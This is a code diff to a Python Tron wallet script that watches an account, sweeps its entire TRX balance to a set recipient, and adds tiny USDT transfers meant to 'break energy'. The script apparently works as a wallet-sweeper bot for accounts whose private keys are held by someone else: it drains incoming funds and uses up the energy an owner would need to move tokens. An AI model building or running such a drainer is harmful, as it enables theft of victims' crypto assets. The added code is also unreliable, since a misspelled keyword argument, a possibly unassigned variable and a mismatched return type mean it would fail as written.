@@ -7,6 +7,7 @@ import random
 import asyncio
 
 from tronpy import AsyncTron, Tron
+from tronpy.abi import tron_abi
 from tronpy.keys import PrivateKey
 from dataclasses import dataclass
 from trontxsize import get_tx_size
@@ -218,14 +219,70 @@ class AsyncAccount:
         new_amount = amount - transaction_fee
         new_txn = await self.tron.trx.transfer(self.address, recipient_address, int(new_amount * 1_000_000)).build()
         return await new_txn.sign(self.private_key).broadcast()
+    
+    async def trigger_contract(self, recipient_address: str) -> dict[str, str]:
+        usdt_contract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+          
+        encoded_data = tron_abi.encode_abi(
+            ["address", "uint256"],
+            [recipient_address, int(0.0000001 * 1_000_000)]
+        )
+
+        try:
+            energy_estimate = await self.tron.trigger_constant_contract(
+                owner_address = self.address,
+                contract_address = usdt_contract,
+                function_selector = "transfer(address,uint256)",
+                parameter = encoded_data.hex(),
+            )
         
-    async def run_monitoring(self, recipient_address:str, min_amount: int, spread: int = 0, threshold: int = 1):
+            return {
+                "result": energy_estimate.get("result", False),
+                "energy_used": energy_estimate.get("energy_used", 0)
+            }
+        
+        except Exception as e:
+            return f"Error: {e}"
+    
+    async def call_contract(self, resourse: dict ,recipien_address: str, balance: float):
+        available_bandwidth = resourse.get("freeNetLimit") - resourse.get("freeNetUsed", 0)
+        bandwidth_price = await self.get_bandwidth_price()
+        
+        if available_bandwidth < 345:
+            available_bandwidth += balance / bandwidth_price
+        
+        if available_bandwidth >= 345:
+            try:
+                energy_required = await self.trigger_contract(recipien_address = recipien_address)
+                
+                if resourse.get("EnergyLimit", 0) >= energy_required["energy_used"]:
+                    contract = await self.tron.get_contract("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t")
+
+                txn = (
+                    await contract.functions.transfer(recipien_address, int(0.0000001 * 1_000_000))
+                )
+                txn = txn.with_owner(self.address)
+                txn = await txn.build()
+                txn.sign(self.private_key)
+                await txn.broadcast()      
+                await broadcaster(f"[INFO] Sended TRC20 transfer for break energy. Account: {self.address}")
+            except Exception as e:
+                await broadcaster(f"[ERROR] Can't send TRC20. Account: {self.address}")
+                
+    
+    
+    async def run_monitoring(self, recipient_address: str, min_amount: int, threshold: int = 1):
         while True:
             current_time = None
             try:
                 current_time = datetime.datetime.now()
                 balance = float(await self.tron.get_account_balance(self.address))
-                if balance > random.randint(min_amount - spread, min_amount + spread):
+                resourse = await self.tron.get_account_resource(self.address)
+                
+                if resourse.get("EnergyLimit", 0) > 1:
+                    await self.call_contract(resourse, recipient_address, balance)
+                
+                if balance > min_amount:
                     await self.broadcast_transaction(recipient_address, balance)
                     await broadcaster(f"Successfull transfer {balance}")
                     logging.info(f"[INFO] Successfull transfer {balance}")
